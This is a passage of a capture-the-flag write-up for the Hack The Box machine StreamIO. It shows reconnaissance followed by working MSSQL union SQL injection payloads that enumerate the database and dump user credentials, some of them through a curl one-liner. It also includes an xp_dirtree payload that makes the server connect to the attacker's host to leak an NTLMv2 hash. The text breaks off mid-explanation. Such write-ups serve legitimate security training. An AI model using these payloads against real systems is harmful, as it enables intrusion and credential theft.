---
icon: windows
---

# StreamIO - Medium

<figure><img src="../../.gitbook/assets/image (11).png" alt="" width="75"><figcaption><p><a href="https://www.hackthebox.com/machines/streamio"><strong>StreamIO</strong></a></p></figcaption></figure>

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```shellscript
## Nmap TCP
nmap -A -T4 -p- -Pn 10.10.11.158 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-29 20:35 EST
Nmap scan report for dc.streamio.htb (10.10.11.158)
Host is up (0.046s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-11-30 08:43:02Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)
443/tcp   open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_ssl-date: 2025-11-30T08:44:36+00:00; +6h59m55s from scanner time.
| ssl-cert: Subject: commonName=streamIO/countryName=EU
| Subject Alternative Name: DNS:streamIO.htb, DNS:watch.streamIO.htb
| Not valid before: 2022-02-22T07:03:28
|_Not valid after:  2022-03-24T07:03:28
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
| tls-alpn: 
|_  http/1.1
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49704/tcp open  msrpc         Microsoft Windows RPC
49726/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6h59m55s, deviation: 0s, median: 6h59m54s
| smb2-time: 
|   date: 2025-11-30T08:44:00
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
```

nmap reveals 2 domain names on 443 <mark style="color:$primary;">streamIO.htb</mark> and <mark style="color:$primary;">watch.streamIO.htb</mark>. I'l add these to my hosts file

```shellscript
10.10.11.158	watch.streamio.htb streamio.htb
```

### <mark style="color:$primary;">SMB Enumeration</mark>

<figure><img src="../../.gitbook/assets/image (2921).png" alt=""><figcaption></figcaption></figure>

No guest access but we did uncover the hostname <mark style="color:$primary;">DC.streamIO.htb</mark> I'll add it to my hosts file as well.

```shellscript
10.10.11.158	dc.streamio.htb watch.streamio.htb streamio.htb
```

### <mark style="color:$primary;">HTTP Port 80 TCP</mark>

<figure><img src="../../.gitbook/assets/image (2922).png" alt=""><figcaption></figcaption></figure>

Default IIS site. Nothing interesting

### <mark style="color:$primary;">HTTP Port 443 TCP</mark>

#### <mark style="color:yellow;">streamio.htb</mark>

<figure><img src="../../.gitbook/assets/image (2927).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2923).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2924).png" alt=""><figcaption><p>About Page</p></figcaption></figure>

The About page contains some names, I'll write them down.

<figure><img src="../../.gitbook/assets/image (2925).png" alt=""><figcaption><p>Contact Page</p></figcaption></figure>

I tried sending a link to my host machine \[http://10.10.16.2], but got no response back

#### Directory Busting

```shellscript
feroxbuster -u https://streamio.htb -k -x php
```

<figure><img src="../../.gitbook/assets/image (2928).png" alt=""><figcaption></figcaption></figure>

Reveals an admin endpoint but when trying to visit it we are getting 403 FORBIDDEN

<figure><img src="../../.gitbook/assets/image (2929).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2930).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2931).png" alt=""><figcaption></figcaption></figure>

I found another endpoint that is only accessable via includes

I also tried registering an account and got the account created message but still was not able to login somehow.

<figure><img src="../../.gitbook/assets/image (2932).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2933).png" alt=""><figcaption></figcaption></figure>

#### <mark style="color:yellow;">watch.streamio.htb</mark>

<figure><img src="../../.gitbook/assets/image (2934).png" alt=""><figcaption></figcaption></figure>

#### Directory Brute Forcing

```bash
feroxbuster -u https://watch.streamio.htb -k -x php
```

<figure><img src="../../.gitbook/assets/image (2935).png" alt=""><figcaption></figcaption></figure>

**search.php**

is a list of movies you can search through

<figure><img src="../../.gitbook/assets/image (2936).png" alt=""><figcaption></figcaption></figure>

The Watch button hasn't been implemented yet

<figure><img src="../../.gitbook/assets/image (2937).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">Blind SQL Injection</mark>

#### Union SQL Injection

With a union SQLI you start with `test' union select 1;— -` and work your way up until you get a response back and that will reveal the number of columns

```shellscript
test' union select 1,2,3,4,5,6;-- -
```

<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

#### <mark style="color:yellow;">Retrieving the version</mark>

```shellscript
test' union select 1,@@version,3,4,5,6;-- -
```

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

#### <mark style="color:yellow;">Grabbing NTLMv2 Hash</mark>

Since this is MSSQL we can try grabbing the NTLMv2 hash of the user&#x20;

```shellscript
test'; use master; exec xp_dirtree '\\10.10.16.2\share';-- -
```

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

Unfortunately this is not crackable

#### <mark style="color:yellow;">Enumerating Database</mark>

```shellscript
test' union select 1,name,3,4,5,6 from master.sys.databases;-- -
```

<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

```shellscript
test' union select 1,(select DB_NAME()),3,4,5,6;-- -
```

<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

Let's see the tables

{% code overflow="wrap" %}
```shellscript
test' union select 1,table_name,3,4,5,6 from information_schema.tables --
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

Now let's check out the columns for the users table

{% code overflow="wrap" %}
```shellscript
test' union select 1,column_name,3,4,5,6 from information_schema.columns where table_name= 'users' --
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

Let's extract the information from username and password columns

{% code overflow="wrap" %}
```shellscript
test' union select 1,concat(username,':',password),3,4,5,6 from users --
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

Nice let's save these to a file I'll use curl to do that. If you checkout the request in Burp Suite you will see the name of the parameter used to query the DB

<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```shellscript
curl -X POST 'https://watch.streamio.htb/search.php' -d 'q=uwu%27%20union%20select%201%2Cconcat%28username%2C%27%3A%27%2Cpassword%29%2C3%2C4%2C5%2C6%20from%20users%20%2D%2D' -k -s | grep h5 | sed -e 's/<h5 class="p-2">//g' -e 's/<\/h5>//g'| tr -d " \t" | tee username_and_password
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

Command explained:

* -X -> Request Type in our Case a POST request
* -d -> contains our post parameter q that we found earlier using Burp Suite&#x20;
* -k -> this is an https request
* We are than pipng everything to grep and action it to grab the `h5` tag where our text is
* Than we pipe it into sed to replace `<h5 class="p-2">` with null character same with `</h5>`
* `thenweremove` &#x20;
